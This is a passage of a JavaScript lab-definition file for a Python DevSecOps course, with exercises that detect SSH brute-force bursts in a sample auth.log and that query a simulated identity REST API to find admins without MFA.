/* sudo learn — Python Module 3: Automation for DevSecOps (PY-118..127).
   Same lab format as labs.js. Loaded after labs-m2.js: pushes its labs into PY_TRACK.LABS,
   attaches reference solutions and drops the Module 3 roadmap rows. Drills are in drills-m3.js.
   New lab fields used here: argv (string for the Arguments box), env (object for the Environment box);
   checks can re-run with run(argv="...", env={...}) and read n["__exit_code__"]. */
(function () {
  "use strict";
  var T = window.PY_TRACK;
  var py = T.py;
  function ex(code) { return '<pre class="ex">' + esc(code) + "</pre>"; }
  function esc(s) { return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
  function lines() { return Array.prototype.slice.call(arguments).join("\n") + "\n"; }

  var LABS = [];

  /* ================================================================== PY-118 */
  var AUTH_LOG = lines(
    "2026-11-10 03:01:12 bastion-01 sshd[811]: Failed password for root from 203.0.113.50 port 50112 ssh2",
    "2026-11-10 03:01:15 bastion-01 sshd[811]: Failed password for root from 203.0.113.50 port 50114 ssh2",
    "2026-11-10 03:01:19 bastion-01 sshd[811]: Failed password for invalid user admin from 203.0.113.50 port 50120 ssh2",
    "2026-11-10 03:02:02 bastion-01 sshd[811]: Failed password for root from 203.0.113.50 port 50131 ssh2",
    "2026-11-10 03:02:40 bastion-01 sshd[811]: Failed password for deploy from 203.0.113.50 port 50140 ssh2",
    "2026-11-10 03:03:05 bastion-01 sshd[811]: Accepted password for deploy from 203.0.113.50 port 50151 ssh2",
    "2026-11-10 03:03:09 bastion-01 sshd[811]: Connection closed by 203.0.113.50 port 50151 [preauth]",
    "2026-11-10 03:05:00 bastion-01 CRON[901]: (root) CMD (run-parts /etc/cron.hourly)",
    "2026-11-10 03:10:00 bastion-01 sshd[830]: Failed password for alice from 10.0.4.31 port 41000 ssh2",
    "2026-11-10 03:10:20 bastion-01 sshd[830]: Accepted password for alice from 10.0.4.31 port 41002 ssh2",
    "2026-11-10 03:20:01 bastion-01 sshd[840]: Failed password for invalid user test from 198.51.100.9 port 33001 ssh2",
    "2026-11-10 03:31:44 bastion-01 sshd[841]: Failed password for invalid user oracle from 198.51.100.9 port 33017 ssh2",
    "2026-11-10 03:43:10 bastion-01 sshd[842]: Failed password for invalid user guest from 198.51.100.9 port 33025 ssh2",
    "2026-11-10 03:55:52 bastion-01 sshd[843]: Failed password for invalid user pi from 198.51.100.9 port 33040 ssh2",
    "2026-11-10 04:07:30 bastion-01 sshd[844]: Failed password for invalid user ubnt from 198.51.100.9 port 33051 ssh2",
    "2026-11-10 04:11:00 bastion-01 sshd[850]: Failed password for root from 192.0.2.77 port 60001 ssh2",
    "2026-11-10 04:11:20 bastion-01 sshd[850]: Failed password for root from 192.0.2.77 port 60004 ssh2",
    "2026-11-10 04:11:41 bastion-01 sshd[850]: Failed password for invalid user ubuntu from 192.0.2.77 port 60010 ssh2",
    "2026-11-10 04:12:03 bastion-01 sshd[850]: Failed password for root from 192.0.2.77 port 60013 ssh2",
    "2026-11-10 04:12:30 bastion-01 sshd[850]: Failed password for invalid user admin from 192.0.2.77 port 60021 ssh2",
    "2026-11-10 04:12:58 bastion-01 sshd[850]: Failed password for root from 192.0.2.77 port 60030 ssh2"
  );

  // Shared by the PY-118 checks: add log lines, re-run the learner's code, put the log back.
  var WITH_EXTRA_LOG = py`
    def with_extra(run, extra):
        orig = open("logs/auth.log", newline="").read()
        try:
            with open("logs/auth.log", "a", newline="") as fh:
                fh.write(extra)
            return run()
        finally:
            with open("logs/auth.log", "w", newline="") as fh:
                fh.write(orig)

    BURST = "".join("2026-11-10 05:00:%02d bastion-01 sshd[900]: Failed password for root from 198.18.0.5 port %d ssh2\n" % (i * 10, 7000 + i) for i in range(5))
  ` + "\n\n";

  LABS.push({
    id: "py-118", n: 18, module: 3, ticket: "PY-118", xp: 100,
    title: "Brute-force at 3 a.m.",
    topic: "Log analysis: regex + datetime",
    from: "Dev Patel · Security",
    story: "<p>The SSH log from <code>bastion-01</code> lit up overnight: dozens of failed logins between 3 and 4 a.m. Most of it is internet background noise, but I need to know two things before the morning stand-up.</p>" +
      "<p>Which IPs were actually <b>brute-forcing</b> us (5 or more failures within 10 minutes)? And did any of them <b>get in</b>?</p>",
    learn:
      '<div class="callout"><b>File in this lab:</b> <code>logs/auth.log</code>, a real-looking OpenSSH log. Print it first: <code>print(open("logs/auth.log").read())</code>.</div>' +
      "<p>This lab combines three things you already know (regex, files, dicts) with one new one: <b>dates and times</b> that you can compare and subtract.</p>" +
      "<h3>One pattern for every login line</h3><p>SSH writes two kinds of login line, and failures for usernames that don't exist say <code>invalid user</code>. An optional non-capturing group <code>(?:...)?</code> handles both:</p>" +
      ex('import re\n\nLINE = re.compile(r"^(\\S+ \\S+) \\S+ sshd\\[\\d+\\]: (Failed|Accepted) password for (?:invalid user )?(\\S+) from (\\S+) port")\n\nm = LINE.match("2026-11-10 03:01:19 bastion-01 sshd[811]: Failed password for invalid user admin from 203.0.113.50 port 50120 ssh2")\nprint(m.groups())') +
      "<p>Lines that aren't logins (cron jobs, closed connections) simply don't match, and <code>match</code> returns <code>None</code>.</p>" +
      "<h3>Text to datetime: strptime</h3><p><code>datetime.strptime(text, format)</code> parses a string into a <code>datetime</code> using format codes. Once it's a datetime you can compare it and do arithmetic.</p>" +
      '<table class="t"><tr><th>Code</th><th>Means</th><th>Example</th></tr>' +
      "<tr><td><code>%Y</code></td><td>4-digit year</td><td>2026</td></tr>" +
      "<tr><td><code>%m</code> / <code>%d</code></td><td>month / day, 2 digits</td><td>11 / 10</td></tr>" +
      "<tr><td><code>%H:%M:%S</code></td><td>hours (24h), minutes, seconds</td><td>03:01:19</td></tr></table>" +
      ex('from datetime import datetime, timedelta\n\nfirst = datetime.strptime("2026-11-10 03:01:12", "%Y-%m-%d %H:%M:%S")\nlast = datetime.strptime("2026-11-10 03:02:40", "%Y-%m-%d %H:%M:%S")\ngap = last - first\nprint(gap, gap.total_seconds())\nprint(gap <= timedelta(minutes=10))') +
      "<p>Subtracting two datetimes gives a <code>timedelta</code> (a duration), and timedeltas compare like numbers.</p>" +
      "<h3>The sliding window</h3><p>\"5 failures within 10 minutes\" means: somewhere in the sorted list of failure times, 5 <b>consecutive</b> failures span 10 minutes or less. Slide a window of 5 along the list and compare the first and last time in it:</p>" +
      '<pre class="code">times:  t0  t1  t2  t3  t4  t5  t6\n        [ window 1       ]\n            [ window 2       ]\n                [ window 3       ]\ncheck:  times[i + 4] - times[i] &lt;= 10 minutes</pre>' +
      ex('times = [1, 2, 3, 20, 21, 22, 23, 24]   # minutes, to keep it simple\nfor i in range(len(times) - 4):\n    window = times[i:i + 5]\n    print(window, "span", window[-1] - window[0])') +
      "<p>The log is in time order already, so each IP's list of failure times comes out sorted.</p>",
    starter: py`
      # PY-118 · Brute-force at 3 a.m.
      import re
      from datetime import datetime, timedelta


      def parse_line(line):
          pass


      # 2) failures: {ip: [datetime, ...]} for every "Failed password" line in logs/auth.log
      #    (you'll also want to remember which IPs had an "Accepted" login, and as which user)


      def is_burst(times, limit=5, window=timedelta(minutes=10)):
          pass


      # 4) attackers: sorted list of IPs whose failures contain a burst


      # 5) Print one line per attacker

    `,
    files: { "logs/auth.log": AUTH_LOG },
    objectives: [
      {
        id: "parse",
        text: "<code>parse_line(line)</code> returns a tuple <code>(time, result, user, ip)</code> for SSH login lines, where <code>time</code> is a <b>datetime</b> and <code>result</code> is <code>\"Failed\"</code> or <code>\"Accepted\"</code>. It returns <code>None</code> for any other line.",
        hints: ["Use the LINE pattern from the Learn tab. If m is None, return None. Otherwise the 4 groups are the time text, result, user and ip; turn the time text into a datetime with strptime.",
          'LINE = re.compile(r"^(\\S+ \\S+) \\S+ sshd\\[\\d+\\]: (Failed|Accepted) password for (?:invalid user )?(\\S+) from (\\S+) port")\n\ndef parse_line(line):\n    m = LINE.match(line)\n    if not m:\n        return None\n    when = datetime.strptime(m.group(1), "%Y-%m-%d %H:%M:%S")\n    return (when, m.group(2), m.group(3), m.group(4))'],
        check: py`
          def check(ns, out, run, src):
              from datetime import datetime
              f = H.fn(ns, "parse_line")
              if not f:
                  return "I can't find a function called parse_line."
              cases = [
                  ("2026-11-10 03:01:12 bastion-01 sshd[811]: Failed password for root from 203.0.113.50 port 50112 ssh2",
                   (datetime(2026, 11, 10, 3, 1, 12), "Failed", "root", "203.0.113.50")),
                  ("2026-11-10 03:01:19 bastion-01 sshd[811]: Failed password for invalid user admin from 203.0.113.50 port 50120 ssh2",
                   (datetime(2026, 11, 10, 3, 1, 19), "Failed", "admin", "203.0.113.50")),
                  ("2026-11-10 03:10:20 bastion-01 sshd[830]: Accepted password for alice from 10.0.4.31 port 41002 ssh2",
                   (datetime(2026, 11, 10, 3, 10, 20), "Accepted", "alice", "10.0.4.31")),
                  ("2026-12-01 23:59:59 web-07 sshd[9]: Failed password for svc-backup from 172.16.9.200 port 2222 ssh2",
                   (datetime(2026, 12, 1, 23, 59, 59), "Failed", "svc-backup", "172.16.9.200")),
              ]
              for line, want in cases:
                  ok, got = H.call(f, line)
                  if not ok:
                      return "parse_line crashed on:\n  " + line + "\n" + type(got).__name__ + ": " + str(got)
                  if isinstance(got, tuple) and len(got) == 4 and isinstance(got[0], str):
                      return "The time should be a datetime, not the string " + repr(got[0]) + ". Use datetime.strptime(text, \"%Y-%m-%d %H:%M:%S\")."
                  if got != want:
                      return "For this line:\n  " + line + "\nparse_line returned " + H.short(got, 140) + "\nexpected " + H.short(want, 140)
              for line in ["2026-11-10 03:05:00 bastion-01 CRON[901]: (root) CMD (run-parts /etc/cron.hourly)",
                           "2026-11-10 03:03:09 bastion-01 sshd[811]: Connection closed by 203.0.113.50 port 50151 [preauth]"]:
                  ok, got = H.call(f, line)
                  if not ok or got is not None:
                      return "Lines that aren't logins should give None. For:\n  " + line + "\nparse_line " + ("crashed" if not ok else "returned " + H.short(got, 100))
              return True
        `
      },
      {
        id: "failures",
        text: "<code>failures</code> is a dict: IP → list of the <b>datetimes</b> of its failed logins, read from <code>logs/auth.log</code> with <code>parse_line</code>.",
        hints: ["Open the log, call parse_line on every line, skip None, and for \"Failed\" lines append the time to failures[ip]. setdefault(ip, []) or a defaultdict(list) saves you an if.",
          'failures = {}\nlogins = {}\nwith open("logs/auth.log") as f:\n    for line in f:\n        entry = parse_line(line)\n        if entry is None:\n            continue\n        when, result, user, ip = entry\n        if result == "Failed":\n            failures.setdefault(ip, []).append(when)\n        else:\n            logins[ip] = user'],
        check: WITH_EXTRA_LOG + py`
          def check(ns, out, run, src):
              from datetime import datetime
              got = ns.get("failures")
              if not isinstance(got, dict):
                  return "I can't find a dict called failures yet."
              if not all(isinstance(v, list) for v in got.values()):
                  return "Each value in failures should be a list of datetimes."
              want = {"203.0.113.50": 5, "10.0.4.31": 1, "198.51.100.9": 5, "192.0.2.77": 6}
              counts = {ip: len(v) for ip, v in got.items()}
              if counts != want:
                  return "failures should have this many failed logins per IP:\n  " + H.short(want, 160) + "\nYours has:\n  " + H.short(counts, 160)
              if not all(isinstance(t, datetime) for v in got.values() for t in v):
                  return "The lists should hold datetime objects (the first item of parse_line's tuple)."
              if got["192.0.2.77"][0] != datetime(2026, 11, 10, 4, 11, 0):
                  return "The first failure for 192.0.2.77 should be 2026-11-10 04:11:00, got " + str(got["192.0.2.77"][0]) + "."
              n, o, e = with_extra(run, "2026-11-10 05:00:00 bastion-01 sshd[900]: Failed password for root from 198.18.0.5 port 1 ssh2\n")
              if len((n.get("failures") or {}).get("198.18.0.5", [])) != 1:
                  return "When I added a failed login from 198.18.0.5 to the log, failures didn't include it. Build failures by reading logs/auth.log."
              return True
        `
      },
      {
        id: "burst",
        text: "<code>is_burst(times, limit=5, window=timedelta(minutes=10))</code> returns <code>True</code> if any <code>limit</code> consecutive times in the sorted list span <code>window</code> or less.",
        hints: ["Loop i over range(len(times) - limit + 1). The window starting at i ends at times[i + limit - 1]. If that minus times[i] is <= window, return True. After the loop, return False.",
          "def is_burst(times, limit=5, window=timedelta(minutes=10)):\n    for i in range(len(times) - limit + 1):\n        if times[i + limit - 1] - times[i] <= window:\n            return True\n    return False"],
        check: py`
          def check(ns, out, run, src):
              from datetime import datetime, timedelta
              f = H.fn(ns, "is_burst")
              if not f:
                  return "I can't find a function called is_burst."
              t0 = datetime(2026, 11, 10, 3, 0, 0)
              def at(*mins):
                  return [t0 + timedelta(minutes=m) for m in mins]
              cases = [
                  (at(0, 1, 2, 3, 4), True, "5 failures in 4 minutes"),
                  (at(0, 1, 2, 3), False, "only 4 failures"),
                  (at(0, 3, 6, 9, 12), False, "5 failures spread over 12 minutes"),
                  (at(0, 2, 4, 6, 10), True, "5 failures where the first and last are exactly 10 minutes apart"),
                  (at(0, 30, 31, 32, 33, 34), True, "a burst that starts at the 2nd failure"),
                  (at(0, 12, 24, 36, 48, 60, 72), False, "7 failures, 12 minutes apart"),
                  ([], False, "an empty list"),
              ]
              for times, want, label in cases:
                  ok, got = H.call(f, times)
                  if not ok:
                      return "is_burst crashed for " + label + ": " + type(got).__name__ + ": " + str(got)
                  if got is None:
                      return "is_burst returned None for " + label + ". Make sure every path ends with return True or return False."
                  if got != want:
                      return "is_burst should return " + str(want) + " for " + label + ", but returned " + H.short(got) + "."
              ok, got = H.call(f, at(0, 1, 2), 3, timedelta(minutes=5))
              if not ok or got is not True:
                  return "Use the limit and window parameters instead of 5 and 10: is_burst(3 failures in 2 minutes, 3, timedelta(minutes=5)) should be True."
              return True
        `
      },
      {
        id: "attackers",
        text: "<code>attackers</code> is the <b>sorted</b> list of IPs whose failures contain a burst.",
        hints: ["Loop over failures.items() and keep the ip when is_burst(times) is True. Wrap it in sorted().",
          "attackers = sorted(ip for ip, times in failures.items() if is_burst(times))"],
        check: WITH_EXTRA_LOG + py`
          def check(ns, out, run, src):
              r = H.expect(ns, "attackers", ["192.0.2.77", "203.0.113.50"], list)
              if r is not True:
                  if ns.get("attackers") and "198.51.100.9" in ns.get("attackers"):
                      return "198.51.100.9 failed 5 times, but over about 47 minutes, so it isn't a burst by our rule. Use is_burst."
                  return r
              n, o, e = with_extra(run, BURST)
              if n.get("attackers") != ["192.0.2.77", "198.18.0.5", "203.0.113.50"]:
                  return "When I added 5 quick failures from 198.18.0.5, attackers came out as " + H.short(n.get("attackers")) + ". Build it from failures."
              return True
        `
      },
      {
        id: "report",
        text: "For each attacker, in order, print <code>ALERT 203.0.113.50: logged in as deploy after 5 failures</code> if that IP also had an Accepted login, otherwise <code>BLOCK 192.0.2.77: 6 failures</code>.",
        hints: ["While reading the log, store Accepted logins in a dict: logins[ip] = user. Then loop over attackers and check if ip in logins.",
          'for ip in attackers:\n    count = len(failures[ip])\n    if ip in logins:\n        print(f"ALERT {ip}: logged in as {logins[ip]} after {count} failures")\n    else:\n        print(f"BLOCK {ip}: {count} failures")'],
        check: WITH_EXTRA_LOG + py`
          def check(ns, out, run, src):
              r = H.printed(out, ["BLOCK 192.0.2.77: 6 failures", "ALERT 203.0.113.50: logged in as deploy after 5 failures"])
              if r is not True:
                  return r
              n, o, e = with_extra(run, BURST)
              if "BLOCK 198.18.0.5: 5 failures" not in H.lines(o):
                  return "When I added 5 quick failures from 198.18.0.5, your report didn't print BLOCK 198.18.0.5: 5 failures. Print from attackers and failures."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. <code>192.0.2.77</code> is blocked, and <code>203.0.113.50</code> guessed the password of the <code>deploy</code> account, so that's now an incident: rotate the credential, check what <code>deploy</code> did after 03:03, and disable password logins in favour of SSH keys.</p>" +
      "<p>Notice <code>198.51.100.9</code>: 5 failures too, but spread over 47 minutes. That's a <b>low-and-slow</b> attack, designed to stay under exactly this kind of threshold. Real detections use several windows (10 minutes, 1 hour, 1 day) for that reason.</p>",
    realworld: "This is what tools like fail2ban do: watch auth.log, count failures per IP in a time window, and block the IP in the firewall. In a SIEM (Splunk, Elastic, Sentinel) you'd write the same rule as a query. You'll see the Linux side of this in the Linux track.",
    quiz: [
      { q: "What does <code>datetime.strptime(\"2026-11-10 03:01:12\", \"%Y-%m-%d %H:%M:%S\")</code> give you?", options: ["A string", "A datetime you can compare and subtract", "A timedelta", "The number of seconds since 1970"], answer: 1,
        why: "strptime = string parse time. It turns text into a datetime object." },
      { q: "<code>later - earlier</code> for two datetimes gives…", options: ["a datetime", "an int number of seconds", "a timedelta (a duration)", "an error"], answer: 2,
        why: "The difference between two points in time is a duration: a timedelta. Compare it with timedelta(minutes=10)." },
      { q: "An IP fails 5 logins spread over 47 minutes. Why didn't our rule catch it?", options: ["The regex missed those lines", "Our window is 10 minutes, and the attacker went slower on purpose", "invalid user lines don't count", "It used IPv6"], answer: 1,
        why: "Low-and-slow attacks stay under the threshold. Use more than one window to catch them." }
    ]
  });

  /* ================================================================== PY-119 */
  var API_USERS = [
    { name: "alice", role: "admin", mfa: true, last_login: "2026-11-09" },
    { name: "bob", role: "developer", mfa: true, last_login: "2026-11-08" },
    { name: "carol", role: "admin", mfa: false, last_login: "2026-10-30" },
    { name: "dave", role: "viewer", mfa: false, last_login: "2026-09-12" },
    { name: "erin", role: "admin", mfa: true, last_login: "2026-11-10" },
    { name: "frank", role: "developer", mfa: false, last_login: "2026-11-02" },
    { name: "grace", role: "admin", mfa: false, last_login: "2026-06-01" },
    { name: "svc-ci", role: "admin", mfa: false, last_login: "2026-11-10" }
  ];

  // A stand-in for the requests library that answers like Kestrel's internal API.
  // The server reads .api/users.json on every request, so checks can change the data.
  var FAKE_REQUESTS = py`
    import sys as _sys


    def _install_fake_requests():
        import types, json as _json
        from urllib.parse import urlparse, parse_qs

        m = types.ModuleType("requests")
        m.__doc__ = "Lab simulator for the requests library. It answers like Kestrel Cloud's internal API."

        class RequestException(Exception):
            pass

        class HTTPError(RequestException):
            def __init__(self, msg, response=None):
                super().__init__(msg)
                self.response = response

        class ConnectionError(RequestException):
            pass

        class Timeout(RequestException):
            pass

        REASONS = {200: "OK", 201: "Created", 400: "Bad Request", 401: "Unauthorized", 403: "Forbidden",
                   404: "Not Found", 405: "Method Not Allowed", 429: "Too Many Requests", 500: "Internal Server Error"}

        class Response:
            def __init__(self, url, status, body):
                self.url = url
                self.status_code = status
                self.reason = REASONS.get(status, "")
                self.ok = status < 400
                self.headers = {"Content-Type": "application/json"}
                self.text = _json.dumps(body)

            def json(self):
                return _json.loads(self.text)

            def raise_for_status(self):
                if self.status_code >= 400:
                    kind = "Client" if self.status_code < 500 else "Server"
                    raise HTTPError(str(self.status_code) + " " + kind + " Error: " + self.reason + " for url: " + self.url, response=self)

            def __repr__(self):
                return "<Response [" + str(self.status_code) + "]>"

        state = {"tickets": 0}
        m.calls = _sys.__dict__.setdefault("_sl_api_calls", [])  # one log that survives re-runs

        def serve(method, url, params, headers, body):
            u = urlparse(url)
            if u.scheme not in ("http", "https") or not u.netloc:
                raise m.exceptions.MissingSchema("Invalid URL " + repr(url) + ": No scheme supplied. Did you mean https://" + url + "?")
            if u.netloc != "api.kestrel.io":
                raise ConnectionError("Failed to resolve " + repr(u.netloc) + " (Name or service not known)")
            query = {k: v[-1] for k, v in parse_qs(u.query).items()}
            query.update({str(k): str(v) for k, v in (params or {}).items()})
            auth = {k.lower(): v for k, v in (headers or {}).items()}.get("authorization", "")
            if auth != "Bearer kc_demo_7f3a":
                return 401, {"error": "missing or invalid token"}
            try:
                users = _json.load(open(".api/users.json"))
            except OSError:
                users = []
            parts = [p for p in u.path.split("/") if p]
            if parts[:1] != ["v1"]:
                return 404, {"error": "no such endpoint"}
            parts = parts[1:]
            if method == "GET" and parts == ["users"]:
                try:
                    page = int(query.get("page", "1"))
                except ValueError:
                    return 400, {"error": "page must be a number"}
                size = 3
                chunk = users[(page - 1) * size: page * size] if page >= 1 else []
                more = page >= 1 and page * size < len(users)
                return 200, {"users": [{"name": x["name"], "role": x["role"]} for x in chunk],
                             "page": page, "next": page + 1 if more else None}
            if method == "GET" and len(parts) == 2 and parts[0] == "users":
                for x in users:
                    if x["name"] == parts[1]:
                        return 200, dict(x)
                return 404, {"error": "user not found"}
            if parts == ["tickets"]:
                if method != "POST":
                    return 405, {"error": "use POST to open a ticket"}
                if not isinstance(body, dict) or not body.get("title"):
                    return 400, {"error": "a ticket needs a title"}
                state["tickets"] += 1
                return 201, {"id": "SEC-" + str(100 + state["tickets"]), "title": body["title"], "status": "open"}
            return 404, {"error": "no such endpoint"}

        def request(method, url, params=None, json=None, headers=None, timeout=None, **kw):
            m.calls.append({"method": method, "url": url, "params": params, "json": json,
                            "headers": dict(headers or {}), "timeout": timeout})
            status, body = serve(method, url, params, headers, json)
            full = url
            if params:
                full += ("&" if "?" in url else "?") + "&".join(str(k) + "=" + str(v) for k, v in params.items())
            return Response(full, status, body)

        def get(url, params=None, **kw):
            return request("GET", url, params=params, **kw)

        def post(url, json=None, **kw):
            return request("POST", url, json=json, **kw)

        exc = types.SimpleNamespace(RequestException=RequestException, HTTPError=HTTPError,
                                    ConnectionError=ConnectionError, Timeout=Timeout,
                                    MissingSchema=type("MissingSchema", (RequestException, ValueError), {}))
        m.exceptions = exc
        m.RequestException, m.HTTPError, m.ConnectionError, m.Timeout = RequestException, HTTPError, ConnectionError, Timeout
        m.Response, m.request, m.get, m.post = Response, request, get, post
        _sys.modules["requests"] = m


    _install_fake_requests()
    del _install_fake_requests, _sys
  `;

  // Check helpers for PY-119: change the API's data, then put it back.
  var API_CHECK = py`
    import json as _j

    def api():
        import sys
        return sys.modules["requests"]

    def with_users(change, fn):
        orig = open(".api/users.json", newline="").read()
        users = _j.loads(orig)
        change(users)
        try:
            with open(".api/users.json", "w", newline="") as fh:
                fh.write(_j.dumps(users))
            return fn()
        finally:
            with open(".api/users.json", "w", newline="") as fh:
                fh.write(orig)
  ` + "\n\n";

  LABS.push({
    id: "py-119", n: 19, module: 3, ticket: "PY-119", xp: 100,
    title: "Who still has admin?",
    topic: "HTTP & REST APIs with requests",
    from: "Dev Patel · Security",
    story: "<p>Our policy says every admin account must use MFA. The identity system has a REST API, so instead of clicking through 40 screens of the admin console, let's ask it directly.</p>" +
      "<p>Get every user, find the <b>admins without MFA</b>, and open a security ticket for each one through the same API.</p>",
    learn:
      '<div class="callout"><b>A simulated API.</b> Browsers can\'t reach Kestrel\'s internal network, so in this lab <code>import requests</code> gives you a simulator that answers exactly like the real API at <code>https://api.kestrel.io/v1</code>. Your code is the same code you\'d write against a real server with the real <a href="https://requests.readthedocs.io" target="_blank" rel="noopener">requests</a> library.</div>' +
      "<h3>HTTP in one minute</h3><p>Your code sends a <b>request</b>: a method (<code>GET</code> to read, <code>POST</code> to create), a URL and some headers. The server sends back a <b>response</b>: a status code and a body, usually JSON.</p>" +
      '<table class="t"><tr><th>Status</th><th>Means</th></tr>' +
      "<tr><td><code>200</code> / <code>201</code></td><td>OK / Created</td></tr>" +
      "<tr><td><code>400</code></td><td>Bad request: your data was wrong</td></tr>" +
      "<tr><td><code>401</code> / <code>403</code></td><td>Not logged in / logged in but not allowed</td></tr>" +
      "<tr><td><code>404</code></td><td>No such thing</td></tr>" +
      "<tr><td><code>429</code> / <code>5xx</code></td><td>Slow down / the server broke</td></tr></table>" +
      "<h3>A GET request</h3>" +
      ex('import requests\n\nr = requests.get("https://api.kestrel.io/v1/users/alice", timeout=5)\nprint(r.status_code, r.json())') +
      "<p>401: the API wants to know who you are. Most APIs take a token in the <code>Authorization</code> header:</p>" +
      ex('import requests\n\nHEADERS = {"Authorization": "Bearer kc_demo_7f3a"}\nr = requests.get("https://api.kestrel.io/v1/users/alice", headers=HEADERS, timeout=5)\nprint(r.status_code)\nuser = r.json()          # JSON body -> Python dict\nprint(user["role"], user["mfa"])') +
      "<p>Always pass <code>timeout=</code>. Without it, a server that never answers makes your script hang forever, which in a pipeline means a stuck build.</p>" +
      "<h3>Errors: raise_for_status()</h3><p><code>requests</code> does <b>not</b> raise an error for a 404 or 500 on its own. Call <code>r.raise_for_status()</code> to turn any 4xx/5xx into an <code>HTTPError</code>, so failures can't slip through as if they were data.</p>" +
      ex('import requests\n\nHEADERS = {"Authorization": "Bearer kc_demo_7f3a"}\nr = requests.get("https://api.kestrel.io/v1/users/zoe", headers=HEADERS, timeout=5)\nprint(r.status_code, r.json())\nr.raise_for_status()') +
      "<h3>Query parameters and pagination</h3><p><code>params=</code> adds <code>?page=2</code> to the URL for you. List endpoints return results a page at a time, with a pointer to the next page (<code>None</code> on the last one).</p>" +
      ex('import requests\n\nHEADERS = {"Authorization": "Bearer kc_demo_7f3a"}\nr = requests.get("https://api.kestrel.io/v1/users", params={"page": 1}, headers=HEADERS, timeout=5)\nprint(r.url)\nprint(r.json())') +
      "<h3>POST: sending JSON</h3><p><code>json=</code> turns a dict into a JSON body. Creating something usually answers <code>201 Created</code>.</p>" +
      ex('import requests\n\nHEADERS = {"Authorization": "Bearer kc_demo_7f3a"}\nr = requests.post("https://api.kestrel.io/v1/tickets", json={"title": "Test ticket"}, headers=HEADERS, timeout=5)\nprint(r.status_code, r.json())') +
      '<table class="t"><tr><th>Endpoint</th><th>Gives</th></tr>' +
      "<tr><td><code>GET /users?page=N</code></td><td><code>{\"users\": [{\"name\", \"role\"}, ...], \"page\": N, \"next\": N+1 or None}</code>, 3 users per page</td></tr>" +
      "<tr><td><code>GET /users/NAME</code></td><td>one user: <code>name</code>, <code>role</code>, <code>mfa</code>, <code>last_login</code></td></tr>" +
      "<tr><td><code>POST /tickets</code></td><td>body <code>{\"title\": ..., \"user\": ...}</code> → <code>{\"id\": \"SEC-101\", ...}</code></td></tr></table>",
    starter: py`
      # PY-119 · Who still has admin?
      import requests

      BASE = "https://api.kestrel.io/v1"
      TOKEN = "kc_demo_7f3a"   # a demo token. In PY-124 you'll move it out of the code.
      HEADERS = {"Authorization": "Bearer " + TOKEN}


      def get_json(path, params=None):
          pass


      def all_users():
          pass


      # 3) admins_without_mfa: sorted names of admins whose mfa is False


      # 4) Open a ticket for each one and print the ticket id

    `,
    prelude: FAKE_REQUESTS,
    files: { ".api/users.json": JSON.stringify(API_USERS, null, 2) + "\n" },
    objectives: [
      {
        id: "get",
        text: "<code>get_json(path, params=None)</code> GETs <code>BASE + path</code> with <code>HEADERS</code>, the given <code>params</code> and <code>timeout=5</code>, calls <code>raise_for_status()</code> and returns the JSON body.",
        hints: ["r = requests.get(BASE + path, params=params, headers=HEADERS, timeout=5), then r.raise_for_status(), then return r.json().",
          "def get_json(path, params=None):\n    r = requests.get(BASE + path, params=params, headers=HEADERS, timeout=5)\n    r.raise_for_status()\n    return r.json()"],
        check: API_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "get_json")
              if not f:
                  return "I can't find a function called get_json."
              req = api()
              del req.calls[:]
              ok, got = H.call(f, "/users/alice")
              if not ok:
                  return "get_json(\"/users/alice\") crashed: " + type(got).__name__ + ": " + str(got)
              if not req.calls:
                  return "get_json didn't send a request. Use requests.get(...)."
              c = req.calls[-1]
              if c["method"] != "GET" or c["url"] != "https://api.kestrel.io/v1/users/alice":
                  return "get_json(\"/users/alice\") requested " + c["method"] + " " + c["url"] + ". It should GET BASE + path."
              if not c["headers"].get("Authorization"):
                  return "The request had no Authorization header, so the API answered 401. Pass headers=HEADERS."
              if c["timeout"] is None:
                  return "Pass timeout=5, so a server that never answers can't hang your script."
              if not isinstance(got, dict) or got.get("name") != "alice" or "mfa" not in got:
                  return "get_json(\"/users/alice\") should return the user dict, got " + H.short(got) + ". Return r.json()."
              ok, got = H.call(f, "/users", {"page": 2})
              if not ok or not isinstance(got, dict) or [u["name"] for u in got.get("users", [])] != ["dave", "erin", "frank"]:
                  return "get_json(\"/users\", {\"page\": 2}) should return page 2 (dave, erin, frank). Pass params=params to requests.get."
              ok, got = H.call(f, "/users/zoe")
              if ok:
                  return "get_json(\"/users/zoe\") returned " + H.short(got) + " for a user that doesn't exist (404). Call r.raise_for_status() so errors raise instead of looking like data."
              if type(got).__name__ != "HTTPError":
                  return "For a 404, get_json should raise HTTPError (from raise_for_status), but it raised " + type(got).__name__ + "."
              return True
        `
      },
      {
        id: "pages",
        text: "<code>all_users()</code> follows the pages, starting at page 1 and stopping when <code>next</code> is <code>None</code>, and returns one list with every user dict.",
        hints: ["Start with users = [] and page = 1. Loop: data = get_json(\"/users\", {\"page\": page}); users.extend(data[\"users\"]); page = data[\"next\"]. Stop when page is None.",
          'def all_users():\n    users = []\n    page = 1\n    while page is not None:\n        data = get_json("/users", {"page": page})\n        users.extend(data["users"])\n        page = data["next"]\n    return users'],
        check: API_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "all_users")
              if not f:
                  return "I can't find a function called all_users."
              ok, got = H.call(f)
              if not ok:
                  return "all_users() crashed: " + type(got).__name__ + ": " + str(got)
              names = [u.get("name") for u in got] if isinstance(got, list) and all(isinstance(u, dict) for u in got) else None
              want = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "svc-ci"]
              if names is None:
                  return "all_users() should return a list of user dicts, got " + H.short(got) + "."
              if names != want:
                  if names == want[:3]:
                      return "all_users() only returned page 1. Keep requesting the next page until next is None."
                  return "all_users() returned users " + H.short(names, 140) + ", expected all 8: " + H.short(want, 140)
              def add():
                  return H.call(f)
              ok, got = with_users(lambda u: u.append({"name": "heidi", "role": "viewer", "mfa": True, "last_login": "2026-11-01"}), add)
              if not ok or len(got) != 9:
                  return "When a 9th user was added (a 3rd full page), all_users() returned " + (str(len(got)) if ok else "an error") + " users. Follow next until it's None instead of a fixed number of pages."
              return True
        `
      },
      {
        id: "nomfa",
        text: "<code>admins_without_mfa</code> is the sorted list of names of users whose role is <code>admin</code> and whose <code>mfa</code> is <code>False</code>. The list endpoint doesn't include <code>mfa</code>, so GET each admin's details.",
        hints: ["Loop over all_users(). For each user whose role is \"admin\", call get_json(\"/users/\" + name) and check the detail's mfa.",
